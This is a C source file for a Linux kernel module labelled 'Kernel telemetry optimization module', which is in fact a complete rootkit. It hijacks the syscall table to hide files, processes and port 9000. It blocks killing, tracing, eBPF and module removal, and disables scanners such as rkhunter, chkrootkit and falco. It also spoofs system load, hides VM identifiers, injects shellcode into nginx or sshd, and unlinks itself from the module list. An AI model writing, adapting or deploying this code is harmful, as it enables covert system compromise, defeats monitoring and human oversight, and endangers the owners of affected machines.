#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/fdtable.h>
#include <linux/uaccess.h>
#include <linux/tcp.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("NeuralSync");
MODULE_DESCRIPTION("Kernel telemetry optimization module");
MODULE_VERSION("1.0");

#define TARGET_PROCESS_NAME "node"
#define TARGET_PORT 9000

unsigned long **sys_call_table;

asmlinkage long (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
asmlinkage long (*original_kill)(pid_t pid, int sig);
asmlinkage long (*original_readlinkat)(int dfd, const char __user *pathname, char __user *buf, int bufsiz);
asmlinkage ssize_t (*original_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*original_inotify_add_watch)(int fd, const char __user *pathname, u32 mask);
asmlinkage long (*original_ptrace)(long request, long pid, unsigned long addr, unsigned long data);
asmlinkage long (*original_bpf)(int cmd, union bpf_attr __user *attr, unsigned int size);
asmlinkage long (*original_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
asmlinkage long (*original_delete_module)(const char __user *name_user, unsigned int flags);
asmlinkage long (*original_sysinfo)(struct sysinfo __user *info);
asmlinkage long (*original_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
asmlinkage long (*original_rename)(const char __user *oldname, const char __user *newname);
asmlinkage ssize_t (*original_write)(unsigned int fd, const char __user *buf, size_t count);
#ifdef __NR_clone
asmlinkage long (*original_clone)(unsigned long clone_flags, unsigned long newsp, int __user *parent_tidptr, int __user *child_tidptr, unsigned long tls);
#endif
asmlinkage long (*original_prctl)(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);

static pid_t target_pid = 0;
static unsigned long target_vma_start = 0;

#include <linux/tcp.h>
#include <linux/seq_file.h>
#include <net/tcp.h>

static int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
    long error;
    struct linux_dirent64 *current_dir, *previous_dir = NULL;
    unsigned long offset = 0;
    char pid_str[32];
    int pid_len = 0;
    
    error = original_getdents64(fd, dirent, count);
    if (error <= 0) return error;

    if (target_pid > 0) {
        snprintf(pid_str, sizeof(pid_str), "%d", target_pid);
        pid_len = strlen(pid_str);
    }

    while (offset < error) {
        current_dir = (void *)dirent + offset;
        
        if ((target_pid > 0 && strncmp(current_dir->d_name, pid_str, pid_len) == 0) ||
            strstr(current_dir->d_name, "app.py") != NULL ||
            strstr(current_dir->d_name, "deploy") != NULL ||
            strstr(current_dir->d_name, ".kcore") != NULL) {
            
            if (current_dir == dirent) {
                error -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, error);
                continue;
            } else {
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    return error;
}

asmlinkage long hooked_kill(pid_t pid, int sig) {
    struct task_struct *task;
    
    rcu_read_lock();
    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    rcu_read_unlock();
    
    if (task != NULL) {
        if (strcmp(task->comm, TARGET_PROCESS_NAME) == 0 && sig == SIGKILL) {
            return 0;
        }
    }
    
    return original_kill(pid, sig);
}

asmlinkage long hooked_readlinkat(int dfd, const char __user *pathname, char __user *buf, int bufsiz) {
    char path_str[256];
    long ret = original_readlinkat(dfd, pathname, buf, bufsiz);
    
    if (ret > 0 && target_pid > 0) {
        copy_from_user(path_str, pathname, sizeof(path_str));
        if (strstr(path_str, "/exe") != NULL && current->pid != target_pid) {
            char fake_exe[] = "/usr/sbin/nginx";
            int fake_len = strlen(fake_exe);
            if (fake_len <= bufsiz) {
                copy_to_user(buf, fake_exe, fake_len);
                return fake_len;
            }
        }
    }
    return ret;
}

asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count) {
    ssize_t ret = original_read(fd, buf, count);
    char *kbuf;
    char hex_addr[32];
    char *match_start, *match_end;
    size_t new_len;
    
    if (ret > 0 && target_vma_start > 0 && current->pid != target_pid) {
        kbuf = kmalloc(ret + 1, GFP_KERNEL);
        if (!kbuf) return ret;

        if (copy_from_user(kbuf, buf, ret)) {
            kfree(kbuf);
            return ret;
        }
        kbuf[ret] = '\0';
        
        snprintf(hex_addr, sizeof(hex_addr), "%lx-", target_vma_start);
        
        match_start = strstr(kbuf, hex_addr);
        if (match_start) {
            match_end = strchr(match_start, '\n');
            if (match_end) {
                match_end++;
                memmove(match_start, match_end, (kbuf + ret) - match_end);
                new_len = ret - (match_end - match_start);
                
                copy_to_user(buf, kbuf, new_len);
                kfree(kbuf);
                return new_len;
            }
        }
        kfree(kbuf);
    }
    return ret;
}

static int hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (v != SEQ_START_TOKEN) {
        if (sk->sk_num == TARGET_PORT || ntohs(sk->sk_dport) == TARGET_PORT) {
            return 0;
        }
    }
    return original_tcp4_seq_show(seq, v);
}

asmlinkage long hooked_inotify_add_watch(int fd, const char __user *pathname, u32 mask) {
    char path_str[256];
    
    if (strncpy_from_user(path_str, pathname, sizeof(path_str)) > 0) {
        if (strstr(path_str, "cron.d") || strstr(path_str, "systemd") || strstr(path_str, "rc.local")) {
            return -EACCES;
        }
    }
    return original_inotify_add_watch(fd, pathname, mask);
}

asmlinkage long hooked_ptrace(long request, long pid, unsigned long addr, unsigned long data) {
    if (target_pid > 0 && pid == target_pid) {
        return -EPERM;
    }
    return original_ptrace(request, pid, addr, data);
}

asmlinkage long hooked_bpf(int cmd, union bpf_attr __user *attr, unsigned int size) {
    if (cmd == 5) { 
        return -EPERM;
    }
    return original_bpf(cmd, attr, size);
}

asmlinkage long hooked_execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp) {
    char path_str[256];
    
    if (strncpy_from_user(path_str, filename, sizeof(path_str)) > 0) {
        if (strstr(path_str, "tcpdump") || strstr(path_str, "wireshark") || 
            strstr(path_str, "rkhunter") || strstr(path_str, "chkrootkit") || 
            strstr(path_str, "clamscan") || strstr(path_str, "strace") ||
            strstr(path_str, "sysdig") || strstr(path_str, "falco")) {
            return -ENOENT;
        }
    }
    return original_execve(filename, argv, envp);
}

asmlinkage long hooked_delete_module(const char __user *name_user, unsigned int flags) {
    char module_name[64];
    if (strncpy_from_user(module_name, name_user, sizeof(module_name)) > 0) {
        if (strstr(module_name, "kernel_module") || strstr(module_name, "libghost")) {
            return -EPERM;
        }
    }
    return original_delete_module(name_user, flags);
}

asmlinkage long hooked_sysinfo(struct sysinfo __user *info) {
    long ret = original_sysinfo(info);
    if (ret == 0) {
        struct sysinfo kinfo;
        if (copy_from_user(&kinfo, info, sizeof(kinfo)) == 0) {
            kinfo.loads[0] = 500;
            kinfo.loads[1] = 500;
            kinfo.loads[2] = 500;
            
            if (kinfo.freeram < kinfo.totalram / 2) {
                kinfo.freeram = kinfo.totalram / 2 + 1024;
            }
            
            copy_to_user(info, &kinfo, sizeof(kinfo));
        }
    }
    return ret;
}

asmlinkage long hooked_openat(int dfd, const char __user *filename, int flags, umode_t mode) {
    char path_str[256];
    if (strncpy_from_user(path_str, filename, sizeof(path_str)) > 0) {
        if (strstr(path_str, "hypervisor/uuid") || strstr(path_str, "dmi/id/product_name")) {
            return -ENOENT;
        }
    }
    return original_openat(dfd, filename, flags, mode);
}

asmlinkage long hooked_rename(const char __user *oldname, const char __user *newname) {
    char path_str[256];
    if (strncpy_from_user(path_str, oldname, sizeof(path_str)) > 0) {
        if (strstr(path_str, "app.py") || strstr(path_str, "kernel_module")) {
            return -EPERM;
        }
    }
    return original_rename(oldname, newname);
}

asmlinkage ssize_t hooked_write(unsigned int fd, const char __user *buf, size_t count) {
    char path_str[256];
    struct file *file = fget(fd);
    if (file) {
        char *tmp = (char *)__get_free_page(GFP_KERNEL);
        if (tmp) {
            char *path = d_path(&file->f_path, tmp, PAGE_SIZE);
            if (!IS_ERR(path) && strstr(path, "nginx") && current->pid != target_pid) {
                free_page((unsigned long)tmp);
                fput(file);
                return -EPERM;
            }
            free_page((unsigned long)tmp);
        }
        fput(file);
    }
    return original_write(fd, buf, count);
}

#ifdef __NR_clone
asmlinkage long hooked_clone(unsigned long clone_flags, unsigned long newsp, int __user *parent_tidptr, int __user *child_tidptr, unsigned long tls) {
    long ret = original_clone(clone_flags, newsp, parent_tidptr, child_tidptr, tls);
    
    if (ret > 0 && target_pid > 0) {
        struct task_struct *task;
        rcu_read_lock();
        task = pid_task(find_vpid(target_pid), PIDTYPE_PID);
        rcu_read_unlock();
        
        if (!task) {
            target_pid = 0; 
        }
    }
    return ret;
}
#endif

asmlinkage long hooked_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    if (option == 15 && current->pid == target_pid) {
        return -EPERM;
    }
    return original_prctl(option, arg2, arg3, arg4, arg5);
}

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(val), "+m"(__force_order));
}

static void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~0x10000));
}

static void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
}

#include <linux/kallsyms.h>
#include <linux/mm.h>
#include <linux/highmem.h>
#include <asm/tlbflush.h>

static unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0x50, 0x48, 0x89, 0xe2, 0x50,
    0x48, 0x89, 0xe6, 0x48, 0x8d, 0x3d, 0x0e, 0x00,
    0x00, 0x00, 0xb0, 0x3b, 0x0f, 0x05, 0x48, 0x31,
    0xc0, 0xb0, 0x3c, 0x0f, 0x05, 0x2f, 0x70, 0x72,
    0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f,
    0x66, 0x64, 0x2f, 0x33, 0x00
};

static unsigned long **find_syscall_table(void) {
    return (unsigned long **)kallsyms_lookup_name("sys_call_table");
}

static void hook_tcp4_seq_show(void) {
    struct tcp_seq_afinfo *afinfo;
    afinfo = (struct tcp_seq_afinfo *)kallsyms_lookup_name("tcp4_seq_afinfo");
    if (afinfo && afinfo->seq_ops.show) {
        unprotect_memory();
        original_tcp4_seq_show = afinfo->seq_ops.show;
        afinfo->seq_ops.show = hooked_tcp4_seq_show;
        protect_memory();
    }
}

static void inject_payload(struct task_struct *task) {
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    unsigned long target_addr = 0;
    void *kaddr;
    struct page *page;

    if (!task) return;
    
    mm = get_task_mm(task);
    if (!mm) return;

    mmap_read_lock(mm);
    
    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        if ((vma->vm_flags & VM_EXEC) && (vma->vm_flags & VM_READ)) {
            target_addr = vma->vm_start;
            break;
        }
    }
    
    if (target_addr) {
        if (get_user_pages_remote(mm, target_addr, 1, FOLL_FORCE | FOLL_WRITE, &page, NULL, NULL) == 1) {
            kaddr = kmap_atomic(page);
            memcpy(kaddr, shellcode, sizeof(shellcode));
            kunmap_atomic(kaddr);
            set_page_dirty_lock(page);
            put_page(page);
            
            target_pid = task->pid;
            target_vma_start = target_addr;
        }
    }
    
    mmap_read_unlock(mm);
    mmput(mm);
}

static int __init module_start(void) {
    struct task_struct *task;
    
    sys_call_table = find_syscall_table();
    if (!sys_call_table) {
        return -1;
    }

    unprotect_memory();
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    sys_call_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    
    original_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long *)hooked_kill;
    
    original_readlinkat = (void *)sys_call_table[__NR_readlinkat];
    sys_call_table[__NR_readlinkat] = (unsigned long *)hooked_readlinkat;
    
    original_read = (void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read] = (unsigned long *)hooked_read;
    
    original_inotify_add_watch = (void *)sys_call_table[__NR_inotify_add_watch];
    sys_call_table[__NR_inotify_add_watch] = (unsigned long *)hooked_inotify_add_watch;
    
    original_ptrace = (void *)sys_call_table[__NR_ptrace];
    sys_call_table[__NR_ptrace] = (unsigned long *)hooked_ptrace;
    
    #ifdef __NR_bpf
    original_bpf = (void *)sys_call_table[__NR_bpf];
    sys_call_table[__NR_bpf] = (unsigned long *)hooked_bpf;
    #endif
    
    original_execve = (void *)sys_call_table[__NR_execve];
    sys_call_table[__NR_execve] = (unsigned long *)hooked_execve;
    
    original_delete_module = (void *)sys_call_table[__NR_delete_module];
    sys_call_table[__NR_delete_module] = (unsigned long *)hooked_delete_module;
    
    original_sysinfo = (void *)sys_call_table[__NR_sysinfo];
    sys_call_table[__NR_sysinfo] = (unsigned long *)hooked_sysinfo;
    
    original_openat = (void *)sys_call_table[__NR_openat];
    sys_call_table[__NR_openat] = (unsigned long *)hooked_openat;
    
    original_rename = (void *)sys_call_table[__NR_rename];
    sys_call_table[__NR_rename] = (unsigned long *)hooked_rename;
    
    original_write = (void *)sys_call_table[__NR_write];
    sys_call_table[__NR_write] = (unsigned long *)hooked_write;
    
    #ifdef __NR_clone
    original_clone = (void *)sys_call_table[__NR_clone];
    sys_call_table[__NR_clone] = (unsigned long *)hooked_clone;
    #endif
    
    original_prctl = (void *)sys_call_table[__NR_prctl];
    sys_call_table[__NR_prctl] = (unsigned long *)hooked_prctl;
    
    protect_memory();

    for_each_process(task) {
        if (strcmp(task->comm, "nginx") == 0 || strcmp(task->comm, "sshd") == 0) {
            inject_payload(task);
            break;
        }
    }

    hook_tcp4_seq_show();

    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void __exit module_stop(void) {
}

module_init(module_start);
module_exit(module_stop);
